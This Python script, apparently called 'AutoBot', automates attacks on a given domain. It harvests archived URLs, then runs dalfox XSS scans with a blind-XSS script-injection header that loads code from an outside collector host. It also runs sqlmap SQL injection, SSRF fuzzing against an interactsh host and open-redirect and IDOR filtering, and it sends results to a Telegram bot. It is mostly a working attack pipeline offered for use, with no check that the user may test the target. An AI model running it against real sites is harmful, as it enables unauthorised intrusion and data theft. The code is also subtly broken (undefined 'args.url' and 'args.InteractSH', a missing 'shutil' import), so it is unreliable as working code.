#!/usr/bin/python3  

from libs.telegramText import NotifyBot, SendDocumentBot, CheckTokens, GetTokens   
import libs.coloredOP as co
from pathlib import Path
from zipfile import ZipFile
import threading 
import os
import datetime
import re
import requests
import subprocess 
import argparse 
import sys

### GLOBAL VARS 
CONFIGPath = "/root/notificationConfig.ini"
TELEGRAMTokens = False
TELEGRAM_KEYS = {}
###

def executeCommand(COMMAND, verbose=False):
    try:
        subprocess.run(COMMAND, shell=True, check=True, text=True)
        if verbose:
            print("\t"+co.bullets.OK, co.colors.GREEN+"Command Executed Successfully."+co.END)
    except subprocess.CalledProcessError as e:
        print("\t"+co.bullets.ERROR, co.colors.BRED+"Error During Command Execution.!!"+co.END)
        print(e.output)
    return 

def ValideteDomain(domain):
    regex =  "^((?!-)[A-Za-z0-9-]{1,63}(?<!-)\\.)+[A-Za-z]{2,6}"
    d = re.compile(regex)
    if(re.search(d, domain)):
        return True
    else:
        return False

def CompressFile(FName, Files):
    with ZipFile(FName, mode="w") as zf:
        for f in Files:
            zf.write(f)

def CollectURLS(Domain):
    # collecting urls using waybackurls 
    COMMAND = 'echo {} | waybackurls | egrep -v ".css|.png|.jpeg|.jpg|.svg|.gif|.ttf|.woff|.woff2|.eot|.otf|.ico|.js" >> temp_urls.txt'.format(Domain)
    print(co.bullets.CProcess, co.colors.GREEN+"Collecting urls with waybackurls"+co.END)
    executeCommand(COMMAND)
    ## Collecting urls from gau
    COMMAND = 'gau -b css,png,jpeg,jpg,svg,gif,ttf,woff,woff2,eot,otf,ico,js {} | anew -q temp_urls.txt'.format(Domain)
    print(co.bullets.CProcess, co.colors.GREEN+"Collecting urls with gau"+co.END) 
    executeCommand(COMMAND)
    # use qsreplace to remove duplicates 
    COMMAND = 'cat temp_urls.txt | sed -e "s/=.*/=/" -e "s/URL: //" | qsreplace -a >> urls.txt'
    executeCommand(COMMAND)
    # deleting extra file 
    os.remove("temp_urls.txt")
    # count number of lines 
    numOfLines = open("urls.txt", "r").read().count("\n")-1
    global TELEGRAMTokens
    if TELEGRAMTokens:
        NotifyBot("🥷 AutoBot : {} URLs collected for {}".format(numOfLines, Domain))

def XSSAttack(Domain, BlindXSS=None):
    global TELEGRAMTokens
    global TELEGRAM_KEYS
    if TELEGRAMTokens:
        NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : XSS Scan Started on target {}".format(Domain))
    COMMAND = 'cat urls.txt | gf xss | httpx -mc 200,201,202,300,301,302 -silent >> xss_urls.txt'
    executeCommand(COMMAND)
    if BlindXSS:
        # checking xss using dalfox including blind xss
        COMMAND = 'dalfox file xss_urls.txt -b {} -o xss_dalfox.txt -H \"referrer: xxx\'><script src=//{}></script>\"'.format(BlindXSS, BlindXSS)
        executeCommand(COMMAND)
    else:
        # checking xss using dalfox for stored and reflected xss
        COMMAND = 'dalfox file xss_urls.txt -o xss_dalfox.txt'
        executeCommand(COMMAND)
    # checking with kxss
    COMMAND = 'cat xss_urls.txt | kxss >> xss_kxss.txt'
    executeCommand(COMMAND)
    # compress files 
    FName = "{}_xss.zip".format(Domain)
    if os.path.isfile("xss_dalfox.txt") and os.path.isfile("xss_kxss.txt"):
        CompressFile(FName, ['xss_dalfox.txt', 'xss_kxss.txt'])
        os.remove("xss_dalfox.txt")
        os.remove("xss_kxss.txt")
    else:
        if os.path.isfile("xss_dalfox"):
            CompressFile(FName, ['xss_dalfox.txt'])
            os.remove("xss_dalfox.txt")
        elif os.path.isfile("xss_kxss.txt"):
            CompressFile(FName, ['xss_kxss.txt'])
            os.remove("xss_kxss.txt")
    # cleaning extra files
    os.remove("xss_urls.txt")
    if TELEGRAMTokens:
        NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : XSS Scan Finished on target {} ✅".format(Domain))
    if os.path.isfile(FName):
        if os.path.getsize(FName) < 52428800:
            if TELEGRAMTokens:
                NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : Download XSS Scan Result : {}".format(FName))
                SendDocumentBot(TELEGRAM_KEYS, FName)
        else:
            if TELEGRAMTokens:
                NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : XSS Scan Result file {} is bigger then 50MB!!, Download it manually from Server ℹ️".format(FName))


def SQLInjection(Domain):
    global TELEGRAMTokens
    global TELEGRAM_KEYS
    if TELEGRAMTokens:
        NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : SQLi Scan Started on target {}".format(Domain))
    executeCommand('cat urls.txt | gf sqli | httpx -mc 200,201,202,300,301,302 -silent >> sqli_urls.txt')
    # perform sql injection attack on target 
    executeCommand('sqlmap -m sqli_urls.txt --batch --random-agent --level 1 | tee sqli_result.txt')
    # compress files 
    FName = "{}_sqli.zip".format(Domain)
    if os.path.isfile("sqli_result.txt"):
        CompressFile(FName, ['sqli_result.txt'])
        os.remove("sqli_result.txt")
        os.remove("sqli_urls.txt")
    if TELEGRAMTokens:
        NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : SQLi Scan Finished on target {} ✅".format(Domain))
    if os.path.isfile(FName):
        if os.path.getsize(FName) < 52428800:
            if TELEGRAMTokens:
                NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : Download SQLi Scan Result : {}".format(FName))
                SendDocumentBot(TELEGRAM_KEYS, FName)
        else:
            if TELEGRAMTokens:
                NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : SQLi Scan Result file {} is bigger then 50MB!!, Download it manually from Server ℹ️".format(FName))

def SSRFScan(Domain, InteractSH):
    global TELEGRAMTokens
    global TELEGRAM_KEYS
    if TELEGRAMTokens:
        NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : SSRF Scan Started on target {}".format(Domain))
    executeCommand('cat urls.txt | gf ssrf | httpx -mc 200,201,202,300,301,302 -silent >> ssrf_urls.txt')
    COMMAND = 'cat ssrf_urls.txt | qsreplace "{}" >> ssrf_paylod_urls.txt'.format(InteractSH)
    executeCommand(COMMAND)
    executeCommand('ffuf -c -w ssrf_paylod_urls.txt -u FUZZ -o ssrf_fuzz_result.txt')
    # cleaning extra files
    os.remove("ssrf_urls.txt")
    if TELEGRAMTokens:
        NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : SSRF Scan Finished on target {} ✅".format(Domain))
        NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : Check Your intactsh instance for any Hit!!")

def OpenRedirect(Domain):
    global TELEGRAMTokens
    global TELEGRAM_KEYS
    if TELEGRAMTokens:
        NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : Open-Redirect Started on target {}".format(Domain))
    executeCommand('cat urls.txt | gf redirect | httpx -mc 200,201,202,300,301,302 -silent >> openredirect_urls.txt')
    # compress files 
    FName = "{}_openRedirect.zip".format(Domain)
    if os.path.isfile("openredirect_urls.txt"):
        CompressFile(FName, ['openredirect_urls.txt'])
        os.remove("openredirect_urls.txt")
    if TELEGRAMTokens:
        NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : Open-Redirect Scan Finished on target {} ✅".format(Domain))
    if os.path.isfile(FName):
        if os.path.getsize(FName) < 52428800:
            if TELEGRAMTokens:
                NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : Download OpenRedirect Scan Result {} for manual analysis.".format(FName))
                SendDocumentBot(TELEGRAM_KEYS, FName)
        else:
            if TELEGRAMTokens: 
                NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : OpenRedirect Scan Result file {} is bigger then 50MB!!, Download it manually from Server ℹ️".format(FName))
    
def IDORScan(Domain):
    global TELEGRAMTokens
    global TELEGRAM_KEYS
    if TELEGRAMTokens:
        NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : IDORScan Started on target {}".format(Domain))
    executeCommand('cat urls.txt | gf idor | httpx -mc 200,201,202,300,301,302 -silent >> idor_urls.txt')
    # compress files 
    FName = "{}_idor.zip".format(Domain)
    if os.path.isfile("idor_urls.txt"):
        CompressFile(FName, ['idor_urls.txt'])
        os.remove("idor_urls.txt")
    if TELEGRAMTokens:
        NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : IDOR Scan Finished on target {} ✅".format(Domain))
    if os.path.isfile(FName):
        if os.path.getsize(FName) < 52428800:
            if TELEGRAMTokens:
                NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : Download IDOR Scan Result {} for manual analysis.".format(FName))
                SendDocumentBot(TELEGRAM_KEYS, FName)
        else:
            if TELEGRAMTokens:
                NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : IDOR Scan Result file {} is bigger then 50MB!!, Download it manually from Server ℹ️".format(FName))

def Banner():
    print(co.colors.BLUE+"################################################################################"+co.END)
    print(co.colors.GREEN+"""                                                                     
        d8888          888            888888b.            888    
       d88888          888            888  "88b           888    
      d88P888          888            888  .88P           888    
     d88P 888 888  888 888888 .d88b.  8888888K.   .d88b.  888888 
    d88P  888 888  888 888   d88""88b 888  "Y88b d88""88b 888    
   d88P   888 888  888 888   888  888 888    888 888  888 888    
  d8888888888 Y88b 888 Y88b. Y88..88P 888   d88P Y88..88P Y88b.  
 d88P     888 "Y88888  "Y888  "Y88P"  8888888P"   "Y88P"  "Y888    """+co.colors.RED+"Version 0.1\n"+co.END)
    print("# "+co.BOLD+"Author     : "+co.colors.CYAN+"Ajay Kumar Tekam (github.com/ajaytekam)"+co.END)
    print("# "+co.BOLD+"Blog       : "+co.colors.CYAN+"https://sec-art.net/"+co.END)
    print("# "+co.BOLD+"About Tool : "+co.colors.CYAN+"Perform Automated Checks for XSS, SQLI, OpenRedirect, SSRF, IDOR."+co.END)
    print(co.colors.BLUE+"################################################################################\n"+co.END)

def printInfo(Domain, OPDir):
    print(co.bullets.INFO, co.colors.CYAN+"Target Domain : {}".format(Domain)+co.END)
    print(co.bullets.INFO, co.colors.CYAN+"Result Dir    : {}\n".format(OPDir)+co.END)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--domain", help="Domain name to perform Attack", type=str)
    parser.add_argument("-o", "--out", help="Output directory name", type=str)
    parser.add_argument("-b", "--blind", help="XSS hunter URL for Blind XSS inection Testing", type=str, default=None)
    parser.add_argument("-i", "--interactSH", help="InteractSH URL for Catching SSRF", type=str)
    args = parser.parse_args()
    # Check argument
    if args.domain is None and args.interactSH is None:
        Banner()
        parser.print_help()
        sys.exit()
    ## GLOBAL Vars
    Banner()
    tDomain = "" # raw domain name
    OPDir = ""   # Output Directory 
    # validae url
    if(ValideteDomain(args.url)):
        tDomain = args.url 
    else:
        print(co.bullets.ERROR, co.colors.BRED+"Invalid Domain:{}".format(args.url)+co.END)
        sys.exit()
    # get the http protocol 
    try:
        tempD = requests.head("https://"+tDomain, allow_redirects=True, timeout=8) 
        Domain = tempD.url
        Domain = re.sub(":443/$", "", Domain)
    except:
        try:
            tempD = requests.head("http://"+tDomain, allow_redirects=True, timeout=8) 
            Domain = tempD.url
            Domain = re.sub(":80/$", "", Domain)
        except:
            print(co.bullets.ERROR, co.colors.BRED+" Error : Could not resolve the Http protocol.!!"+co.END)
            sys.exit(1) 
    # check talegram keys 
    global CONFIGPath
    global TELEGRAMTokens
    global TELEGRAM_KEYS
    retVal = CheckTokens(CONFIGPath)
    if retVal == 1:
        TELEGRAMTokens = True
        apiToken, chatID = GetTokens(CONFIGPath)
        TELEGRAM_KEYS['apiToken'] = apiToken
        TELEGRAM_KEYS['chatID'] = chatID
    elif retVal == 2:
        print(co.bullets.ERROR+co.colors.RED+"Telegram Bot keys not found.!1"+co.END)
    elif retVal == 3:
        print(co.bullets.ERROR+co.colors.RED+"Telegram Bot Config File not found.!1"+co.END)
    # Sending telegram message
    if TELEGRAMTokens:
        NotifyBot(TELEGRAM_KEYS, "🥷 AutoBot : Automated attcker staretd for domain : {}".format(tDomain))
    # Create output dir 
    if args.out is not None:
        OPDir = args.out
        if os.path.isdir(OPDir):
            print(co.bullets.INFO+co.colors.CYAN+" {} already exists...".format(OPDir)+co.END)
            print(co.bullets.INFO+co.colors.CYAN+" Adding time-stamp into the directory name as suffix"+co.END)
            Date = str(datetime.datetime.now())
            WORKDIR = re.sub("-|:|\.|\ ", "_", Date)
            OPDir += "_{}".format(WORKDIR)
    else:
        OPDir = "./autobot_{}".format(tDomain)
        if os.path.isdir(OPDir):
            print(co.bullets.INFO+co.colors.CYAN+" {} already exists...".format(OPDir)+co.END)
            print(co.bullets.INFO+co.colors.CYAN+" Adding time-stamp into the directory name as suffix"+co.END)
            Date = str(datetime.datetime.now())
            WORKDIR = re.sub("-|:|\.|\ ", "_", Date)
            OPDir += "_{}".format(WORKDIR)
    os.mkdir(OPDir) 
    printInfo(Domain, OPDir)
    #################
    # Change directory
    os.chdir(OPDir)
    ## Collecting urls gg
    print(co.bullets.INFO+co.colors.CYAN+"Collecting URLs.."+co.END)
    CollectURLS(tDomain)
    print(co.bullets.INFO+co.colors.CYAN+"URLs collected.."+co.END)
    ## strat XSS scan 
    t1 = threading.Thread(target=XSSAttack, args=(tDomain, args.blind,))
    t1.start()
    print(co.bullets.INFO+co.colors.CYAN+"XSS Scan Started.."+co.END)
    t1.join()
    ## start SQLi scan 
    t2 = threading.Thread(target=SQLInjection, args=(tDomain,))
    t2.start()
    print(co.bullets.INFO+co.colors.CYAN+"SQLi Scan Started.."+co.END)
    t2.join()
    ## start SSRF Scan 
    t3 = threading.Thread(target=SSRFScan, args=(tDomain,args.InteractSH,))
    t3.start()
    print(co.bullets.INFO+co.colors.CYAN+"SSRF Scan Started.."+co.END)
    t3.join()
    ## Open redirect scan 
    t4 = threading.Thread(target=OpenRedirect, args=(tDomain,))
    t4.start()
    print(co.bullets.INFO+co.colors.CYAN+"Open Redirect Scan Started.."+co.END)
    t4.join()
    # IDOR Scan 
    t5 = threading.Thread(target=IDORScan, args=(tDomain,))
    t5.start()
    print(co.bullets.INFO+co.colors.CYAN+"IDOR Scan Started.."+co.END)
    t5.join() 
    print(co.bullets.DONE+co.colors.GREEN+"All Scan Completed"+co.END)
    os.chdir("..")
    files = os.listdir(OPDir)        
    try:
        CompressFile("{}_autobot.zip".format(OPDir), files)
        print(co.bullets.DONE+co.colors.GREEN+"Resultfile : {}_autobot.zip".format(OPDir)+co.END)
        shutil.rmtree(OPDir)
    except:
        print(co.bullets.DONE+co.colors.GREEN+"Resultfile : {}".format(OPDir)+co.END)
    print(co.bullets.DONE+co.colors.GREEN+"AutoBot Scan Completed."+co.END)

if __name__ == "__main__":
    main()

